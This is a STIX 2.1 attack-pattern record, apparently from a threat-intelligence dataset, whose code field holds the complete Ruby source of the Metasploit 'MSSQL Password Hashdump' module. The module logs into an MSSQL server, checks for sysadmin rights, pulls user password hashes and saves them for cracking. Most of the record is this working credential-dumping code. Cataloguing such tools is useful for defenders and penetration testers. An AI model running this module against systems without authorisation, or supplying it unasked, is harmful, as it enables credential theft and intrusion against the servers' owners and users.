{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0c5e8cd-bfb5-4018-bb12-3280a1d1e22e",
    "created": "2024-08-14T16:26:54.982969Z",
    "modified": "2024-08-14T16:26:54.982974Z",
    "name": "MSSQL Password Hashdump",
    "description": "Q This module extracts the usernames and encrypted password hashes from a MSSQL server and stores them for later cracking. This module also saves information about the server version and table names, which can be used to seed the wordlist. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mssql/mssql_hashdump.rb",
            "external_id": "mssql_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MSSQL Password Hashdump',\n      'Description'    => %Q{\n          This module extracts the usernames and encrypted password\n        hashes from a MSSQL server and stores them for later cracking.\n        This module also saves information about the server version and\n        table names, which can be used to seed the wordlist.\n      },\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n\n    if !mssql_login_datastore\n      print_error(\"Invalid SQL Server credentials\")\n      return\n    end\n\n    service_data = {\n        address: ip,\n        port: rport,\n        service_name: 'mssql',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        module_fullname: self.fullname,\n        origin_type: :service,\n        private_data: datastore['PASSWORD'],\n        private_type: :password,\n        username: datastore['USERNAME']\n    }\n\n    if datastore['USE_WINDOWS_AUTHENT']\n      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN\n      credential_data[:realm_value] = datastore['DOMAIN']\n    end\n    credential_data.merge!(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n        core: credential_core,\n        last_attempted_at: DateTime.now,\n        status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }\n    login_data.merge!(service_data)\n\n    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]\n\n    unless is_sysadmin == 0\n      login_data[:access_level] = 'admin'\n    end\n\n    create_credential_login(login_data)\n\n    # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)\n    instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\\\')[1]\n    print_status(\"Instance Name: #{instancename.inspect}\")\n    version = mssql_query(mssql_sql_info())[:rows][0][0]\n    version_year = version.split('-')[0].slice(/\\d\\d\\d\\d/)\n\n    unless is_sysadmin == 0\n      mssql_hashes = mssql_hashdump(version_year)\n      unless mssql_hashes.nil?\n        report_hashes(mssql_hashes,version_year)\n      end\n    end\n  end\n\n\n  # Stores the grabbed hashes as loot for later cracking\n  # The hash format is slightly different between 2k and 2k5/2k8\n  def report_hashes(mssql_hashes, version_year)\n\n    case version_year\n    when \"2000\"\n      hashtype = \"mssql\"\n\n    when \"2005\", \"2008\"\n      hashtype = \"mssql05\"\n    when \"2012\", \"2014\"\n      hashtype = \"mssql12\"\n    end\n\n    this_service = report_service(\n          :host  => datastore['RHOST'],\n          :port => datastore['RPORT'],\n          :name => 'mssql',\n          :proto => 'tcp'\n          )\n\n    tbl = Rex::Text::Table.new(\n      'Header'  => 'MS SQL Server Hashes',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Hash']\n    )\n\n    service_data = {\n        address: ::Rex::Socket.getaddress(rhost,true),\n        port: rport,\n        service_name: 'mssql',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    mssql_hashes.each do |row|\n      next if row[0].nil? or row[1].nil?\n      next if row[0].empty? or row[1].empty?\n\n      credential_data = {\n          module_fullname: self.fullname,\n          origin_type: :service,\n          private_type: :nonreplayable_hash,\n          private_data: \"0x#{row[1]}\",\n          username: row[0],\n          jtr_format: hashtype\n      }\n\n      credential_data.merge!(service_data)\n\n      credential_core = create_credential(credential_data)\n\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      login_data.merge!(service_data)\n      login = create_credential_login(login_data)\n\n      tbl << [row[0], row[1]]\n      print_good(\"Saving #{hashtype} = #{row[0]}:#{row[1]}\")\n    end\n  end\n\n  # Grabs the user tables depending on what Version of MSSQL\n  # The queries are different between 2k and 2k/2k8\n  def mssql_hashdump(version_year)\n    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]\n\n    if is_sysadmin == 0\n      print_error(\"The provided credentials do not have privileges to read the password hashes\")\n      return nil\n    end\n\n    case version_year\n    when \"2000\"\n      results = mssql_query(mssql_2k_password_hashes())[:rows]\n\n    when \"2005\", \"2008\", \"2012\", \"2014\"\n      results = mssql_query(mssql_2k5_password_hashes())[:rows]\n    end\n\n    return results\n\n  end\n\n\nend\n"
}